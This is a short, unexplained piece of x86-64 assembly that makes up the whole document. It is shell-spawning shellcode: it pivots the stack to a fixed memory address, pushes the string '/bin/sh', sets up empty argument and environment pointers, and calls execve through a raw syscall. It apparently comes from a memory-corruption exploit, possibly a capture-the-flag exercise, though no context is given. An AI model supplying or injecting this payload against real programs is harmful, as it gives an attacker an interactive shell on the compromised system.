mov    rsp,0x601080
add    rsp,0x1000
mov    rbx,0x0068732f6e69622f
push   rbx
mov    rdi,rsp
xor    rbx,rbx
push   rbx
mov    rsi,rsp
mov    rdx,rsp
mov    rax,0x3b
syscall
